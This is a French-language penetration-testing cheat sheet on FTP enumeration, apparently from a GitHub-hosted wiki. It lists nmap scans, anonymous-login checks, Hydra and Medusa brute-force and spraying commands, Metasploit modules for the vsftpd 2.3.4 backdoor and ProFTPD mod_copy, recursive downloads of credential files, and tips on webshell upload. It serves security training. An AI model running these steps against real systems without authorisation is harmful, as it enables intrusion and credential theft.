#  FTP Enumeration

FTP (File Transfer Protocol) est un protocole de transfert de fichiers en clair opérant sur les ports 21 (contrôle) et 20 (données). C'est une cible privilégiée en pentest car il expose fréquemment des accès anonymes, des credentials en clair et des fichiers sensibles.


##  Objectifs

- Identifier la version du serveur FTP
- Tester l'accès anonyme
- Enumérer les fichiers accessibles
- Trouver des credentials
- Identifier des versions vulnérables


##  Ports

| Port | Service     |
|------|-------------|
| 21   | FTP Control |
| 20   | FTP Data    |



##  Quick Enumeration
```bash
# Scan rapide
nmap -p21 <target>

# Test accès anonyme
ftp <target>

# Enum avec nmap
nmap -p21 --script ftp-anon,ftp-syst,ftp-bounce <target>

# Bruteforce rapide
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://<target>
```



##  Workflow 
```
 1. Scan du port 21
 2. Identification de la version FTP
 3. Test accès anonyme
 4. Enumération des fichiers
 5. Bruteforce / credentials
 6. Exploitation version vulnérable
 7. Download fichiers sensibles
```


##  Nmap

### Scan basique
```bash
nmap -p21 <target>
```

### Détection version
```bash
nmap -p21 -sV <target>
```

### Scripts NSE
```bash
# Accès anonyme
nmap -p21 --script ftp-anon <target>

# Info système
nmap -p21 --script ftp-syst <target>

# FTP Bounce
nmap -p21 --script ftp-bounce <target>

# Full enum
nmap -p21 --script ftp-* <target>
```


##  Enumeration

### Connexion manuelle
```bash
ftp <target>
```

### Avec credentials
```bash
ftp <target>
# Login : user
# Password : password
```

### Listing récursif via wget
```bash
wget -r ftp://anonymous:anonymous@<target>/
```

### Enum avancée via curl
```bash
curl -u user:password ftp://<target>/ --list-only
```


##  Credentials Attacks

### Bruteforce Hydra
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://<target>
```

### Bruteforce liste d'users
```bash
hydra -L users.txt -P passwords.txt ftp://<target>
```

### Password spraying Medusa
```bash
medusa -h <target> -U users.txt -p Password123 -M ftp
```


##  Exploitation

### Exploit connu
```bash
searchsploit ftp
searchsploit vsftpd
searchsploit proftpd
```

### vsftpd 2.3.4 Backdoor (CVE-2011-2523)
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
run
```

### ProFTPD mod_copy (CVE-2015-3306)
```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <target>
run
```


##  Post-Exploitation

- Récupérer tous les fichiers accessibles
- Chercher des fichiers de configuration (`.env`, `config.php`, `web.config`)
- Extraire des credentials en clair
- Utiliser les fichiers pour pivot ou escalade de privilèges
```bash
# Download récursif
wget -r --no-passive ftp://user:pass@<target>/

# Via curl
curl -u user:pass ftp://<target>/ -o output.txt
```


##  Anonymous Access

### Test connexion anonyme
```bash
ftp <target>
# Login    : anonymous
# Password : anonymous
```

### Nmap check
```bash
nmap -p21 --script ftp-anon <target>
```

### Via curl
```bash
curl ftp://anonymous:anonymous@<target>/
```


##  Points d'attaque

- Accès anonyme activé
- Credentials transmis en clair (pas de chiffrement)
- Version vulnérable (vsftpd 2.3.4, ProFTPD, etc.)
- Fichiers sensibles accessibles en lecture
- Permissions en écriture (upload de webshell)
- FTP Bounce activé


::: info Tips  

- Toujours tester `anonymous:anonymous` en premier
- Utiliser `wget -r` pour tout récupérer d'un coup
- Chercher `.bash_history`, `.env`, `config`, `passwd`, `backup`
- Keywords : `password`, `credentials`, `secret`, `key`
- Vérifier les permissions en écriture (upload de webshell possible)
- Corréler Nmap + accès manuel + Hydra

:::

::: details  Checklist

- Port 21 ouvert
- Version FTP identifiée
- Accès anonyme testé
- Fichiers listés et récupérés
- Bruteforce effectué
- Exploit version testé
- Permissions en écriture vérifiées

:::

## 🧾 Notes
```
 # Notes terrain
```


##  Tools

- [Nmap](https://nmap.org/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa](https://github.com/jmk-foofus/medusa)
- [Metasploit](https://www.metasploit.com/)
- [curl](https://curl.se/)
- [wget](https://www.gnu.org/software/wget/)


## 📚 Ressources

- [HackTricks  FTP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
- [PayloadsAllTheThings FTP](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Nmap FTP Scripts](https://nmap.org/nsedoc/categories/ftp.html)
- [vsftpd 2.3.4 Exploit](https://www.exploit-db.com/exploits/17491)
- [ProFTPD mod_copy Exploit](https://www.exploit-db.com/exploits/36803)





<div class="page-footer">

<span>📅 ![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![✏️ Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ftp.md)</span>

</div>